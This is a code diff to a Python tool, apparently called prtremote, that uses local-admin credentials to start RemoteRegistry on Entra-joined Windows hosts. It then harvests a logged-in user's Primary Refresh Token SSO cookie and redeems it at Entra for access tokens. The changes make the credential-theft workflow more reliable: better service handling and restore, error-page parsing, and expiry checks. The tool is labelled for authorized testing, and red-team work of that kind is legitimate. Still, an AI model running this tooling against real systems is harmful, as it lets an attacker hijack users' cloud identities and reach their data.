@@ -22,18 +22,21 @@ prtremote -- remote PRT SSO cookie tooling for Entra/hybrid-joined Windows hosts
 check and dump need local admin. For authorized security assessment of systems
 you own or are permitted to test.
 
-    python3 prtremote.py check ENDPOINT/labadmin:Passw0rd!@win11
-    python3 prtremote.py dump  ENDPOINT/labadmin:Passw0rd!@win11 -run-user achen
+    python3 prtremote.py check ENDPOINT/labadmin:"$PASSWORD"@win11
+    python3 prtremote.py dump  ENDPOINT/labadmin:"$PASSWORD"@win11 -run-user achen
     python3 prtremote.py auth  --prt prt_cookie_win11_achen.txt --graph
 """
 
 import argparse
 import base64
 import datetime
+import html
 import io
 import json
 import logging
 import os
+import re
+import shlex
 import struct
 import sys
 import time
@@ -265,9 +268,12 @@ class JoinStateProbe:
     # Remote Registry service management (best-effort start/restore)
     # ------------------------------------------------------------------ #
     def _open_scm(self):
-        rpc = transport.SMBTransport(
-            self.smb.getRemoteHost(), filename=r"\svcctl", smb_connection=self.smb
-        )
+        # Match Impacket's own reg.py transport setup.  In particular, include
+        # ``\pipe`` in the binding instead of relying on SMBTransport's filename
+        # normalization, which differs between Impacket releases.
+        binding = r"ncacn_np:%s[\pipe\svcctl]" % self.smb.getRemoteHost()
+        rpc = transport.DCERPCTransportFactory(binding)
+        rpc.set_smb_connection(self.smb)
         dce = rpc.get_dce_rpc()
         dce.connect()
         dce.bind(scmr.MSRPC_UUID_SCMR)
@@ -276,12 +282,26 @@ class JoinStateProbe:
     def ensure_remote_registry(self):
         """Start the RemoteRegistry service if stopped. Returns a callable that
         stops it again afterwards, or None if it was already running / nothing to
-        restore. Every step is best-effort and non-fatal: if we can't manage the
+        restore. If the service was disabled, its original startup type is restored
+        as well. Every step is best-effort and non-fatal: if we can't manage the
         service, we simply proceed and let the \\winreg open surface a clear error."""
+        original_start_type = None
+        changed_start_type = False
+        started_by_us = False
+
+        def wait_for_state(dce, svc, wanted, timeout=10):
+            deadline = time.time() + timeout
+            while time.time() < deadline:
+                state = scmr.hRQueryServiceStatus(dce, svc)["lpServiceStatus"]["dwCurrentState"]
+                if state == wanted:
+                    return True
+                time.sleep(0.25)
+            return False
+
         try:
             dce = self._open_scm()
         except Exception as e:
-            logging.debug("Could not open SCM to check RemoteRegistry: %s", e)
+            logging.warning("Could not open SCM to manage RemoteRegistry: %s", e)
             return None
 
         try:
@@ -289,40 +309,84 @@ class JoinStateProbe:
             svc = scmr.hROpenServiceW(dce, scm, "RemoteRegistry\x00")["lpServiceHandle"]
 
             # Already running? Leave it alone (don't stop a service we didn't start).
-            was_running = False
             try:
                 state = scmr.hRQueryServiceStatus(dce, svc)["lpServiceStatus"]["dwCurrentState"]
-                was_running = (state == scmr.SERVICE_RUNNING)
             except Exception as e:
-                logging.debug("QueryServiceStatus failed (%s); will try to start anyway", e)
-            if was_running:
+                logging.warning("Could not query RemoteRegistry status: %s", e)
+                return None
+            if state == scmr.SERVICE_RUNNING:
                 logging.debug("RemoteRegistry already running")
                 return None
+            if state != scmr.SERVICE_STOPPED:
+                logging.debug("RemoteRegistry is in state %s; leaving it unchanged", state)
+                return None
 
-            # Make sure it isn't disabled, then start it. Both are best-effort.
+            # Record the startup type before changing it so a disabled service can
+            # be put back exactly as it was after the registry reads finish.
             try:
-                scmr.hRChangeServiceConfigW(
-                    dce, svc, scmr.SERVICE_NO_CHANGE, scmr.SERVICE_DEMAND_START,
-                    scmr.SERVICE_NO_CHANGE, "\x00", None, 0, "\x00", None, 0, "\x00",
-                )
+                config = scmr.hRQueryServiceConfigW(dce, svc)["lpServiceConfig"]
+                original_start_type = config["dwStartType"]
             except Exception as e:
-                logging.debug("ChangeServiceConfig failed (%s); continuing", e)
+                logging.warning("Could not query RemoteRegistry configuration: %s", e)
+                return None
+
+            if original_start_type == scmr.SERVICE_DISABLED:
+                try:
+                    scmr.hRChangeServiceConfigW(
+                        dce, svc, dwStartType=scmr.SERVICE_DEMAND_START
+                    )
+                    changed_start_type = True
+                except Exception as e:
+                    logging.warning("Could not enable RemoteRegistry temporarily: %s", e)
+                    return None
+
             try:
                 scmr.hRStartServiceW(dce, svc)
-                logging.info("Started RemoteRegistry (will stop it again afterwards)")
+                started_by_us = True
             except Exception as e:
-                logging.debug("StartService returned (%s); may already be starting", e)
+                logging.warning("Could not start RemoteRegistry: %s", e)
+                if changed_start_type:
+                    scmr.hRChangeServiceConfigW(
+                        dce, svc, dwStartType=original_start_type
+                    )
+                return None
+
+            reached_running = wait_for_state(dce, svc, scmr.SERVICE_RUNNING)
+            if not reached_running:
+                logging.warning("RemoteRegistry did not reach the running state")
+            else:
+                logging.info("Started RemoteRegistry (will restore its prior state afterwards)")
 
             def restore():
+                d = None
                 try:
                     d = self._open_scm()
                     s = scmr.hROpenSCManagerW(d)["lpScHandle"]
                     h = scmr.hROpenServiceW(d, s, "RemoteRegistry\x00")["lpServiceHandle"]
-                    scmr.hRControlService(d, h, scmr.SERVICE_CONTROL_STOP)
-                    d.disconnect()
-                    logging.debug("Stopped RemoteRegistry")
+                    if started_by_us:
+                        try:
+                            scmr.hRControlService(d, h, scmr.SERVICE_CONTROL_STOP)
+                            if not wait_for_state(d, h, scmr.SERVICE_STOPPED):
+                                logging.warning("RemoteRegistry did not stop within 10 seconds")
+                        except Exception as e:
+                            logging.warning("Could not stop RemoteRegistry: %s", e)
+                    if changed_start_type:
+                        try:
+                            scmr.hRChangeServiceConfigW(
+                                d, h, dwStartType=original_start_type
+                            )
+                        except Exception as e:
+                            logging.warning(
+                                "Could not restore RemoteRegistry startup type: %s", e
+                            )
+                    logging.debug("Restored RemoteRegistry service state")
                 except Exception as e:
-                    logging.debug("Failed to stop RemoteRegistry: %s", e)
+                    logging.warning("Failed to restore RemoteRegistry service state: %s", e)
+                finally:
+                    try:
+                        d.disconnect()
+                    except Exception:
+                        pass
 
             return restore
         except Exception as e:
@@ -495,9 +559,17 @@ def run_check(options, domain, username, password, remoteName):
 
     if azure_ad and loaded:
         candidates = [name or sid for sid, name in loaded]
+        # Never reuse options.target here: it is the raw CLI argument and may
+        # contain a plaintext password.  Emit a literal shell-variable reference
+        # instead, so copying the command uses $PASSWORD without disclosing it.
+        # If the variable is unset, the existing getpass() fallback still applies.
+        account = ('%s/' % domain if domain else '') + username
+        safe_target = ('%s:"$PASSWORD"@%s'
+                       % (shlex.quote(account), shlex.quote(remoteName))
+                       if account else shlex.quote(remoteName))
         print('')
         say('Harvest with: prtremote.py dump %s -run-user %s'
-            % (options.target, candidates[0]))
+            % (safe_target, shlex.quote(candidates[0])))
         if len(candidates) > 1:
             say('Other candidates: %s' % ', '.join(candidates[1:]))
     elif not azure_ad:
@@ -876,20 +948,38 @@ def describe_authorize_failure(res, location):
         return ('Entra returned a fresh nonce instead of a code, so the cookie was '
                 'already stale -- harvest a new one and redeem it right away')
 
-    # Entra puts the real error in a $Config= JSON blob in the error page. Trim
-    # back from the script terminator rather than by a fixed offset, so a change
-    # in their whitespace doesn't cost us the message.
-    start, stop = res.content.find(b'$Config='), res.content.find(b'//]]>')
-    if start != -1 and stop != -1:
+    # Entra commonly puts the real error in a $Config JSON object. Decode one
+    # JSON value rather than depending on a particular script terminator, which
+    # has changed across login-page versions.
+    body = res.text
+    marker = body.find('$Config=')
+    if marker != -1:
         try:
-            cfg = json.loads(res.content[start + 8:stop].strip().rstrip(b';'))
-        except ValueError:
+            cfg, _ = json.JSONDecoder().raw_decode(body[marker + 8:].lstrip())
+        except (TypeError, ValueError):
             cfg = {}
         detail = ' '.join(str(cfg[k]) for k in ('sErrorCode', 'strMainMessage',
                                                 'strServiceExceptionMessage')
                           if cfg.get(k))
         if detail:
             return 'Entra refused the cookie: %s' % detail
+
+    # Some newer pages render the error directly into HTML instead. Return only
+    # the compact AADSTS message, never the full page (which may contain state).
+    plain = html.unescape(re.sub(r'<[^>]+>', ' ', body))
+    plain = re.sub(r'\s+', ' ', plain).strip()
+    aadsts = re.search(r'(AADSTS\d+[^\r\n<]{0,500})', plain, re.IGNORECASE)
+    if aadsts:
+        return 'Entra refused the cookie: %s' % aadsts.group(1).strip()
+
+    title = re.search(r'<title[^>]*>(.*?)</title>', body,
+                      re.IGNORECASE | re.DOTALL)
+    if title:
+        title_text = re.sub(r'\s+', ' ', html.unescape(title.group(1))).strip()
+        if title_text:
+            return ('Entra returned an interactive page instead of a code: %s '
+                    '(the cookie may be stale, or MFA/Conditional Access may be required)'
+                    % title_text)
     return 'unexpected reply from /authorize (HTTP %d)' % res.status_code
 
 
@@ -901,6 +991,10 @@ def redeem_prt_cookie(cookie, resource):
     if 'request_nonce' not in claims:
         raise RuntimeError('the cookie has no request_nonce claim -- either it is '
                            'not a PRT SSO cookie, or it needs a session key')
+    now = int(time.time())
+    if claims.get('exp') is not None and int(claims['exp']) <= now:
+        raise RuntimeError('the PRT SSO cookie has expired -- harvest a new one and '
+                           'redeem it immediately (normally within about 5 minutes)')
 
     params = {
         'client_id': AUTH_CLIENT,
@@ -1033,8 +1127,8 @@ def build_parser():
         description='Remote PRT SSO cookie tooling for Entra/hybrid-joined Windows '
                     'hosts. Authorized security testing only.',
         epilog="examples:\n"
-               "  prtremote.py check ENDPOINT/labadmin:'Passw0rd!'@win11\n"
-               "  prtremote.py dump  ENDPOINT/labadmin:'Passw0rd!'@win11 -run-user achen\n"
+               "  prtremote.py check ENDPOINT/labadmin:\"$PASSWORD\"@win11\n"
+               "  prtremote.py dump  ENDPOINT/labadmin:\"$PASSWORD\"@win11 -run-user achen\n"
                "  prtremote.py auth  --prt prt_cookie_win11_achen.txt --graph\n")
     sub = parser.add_subparsers(dest='mode', metavar='{check,dump,auth}')
 
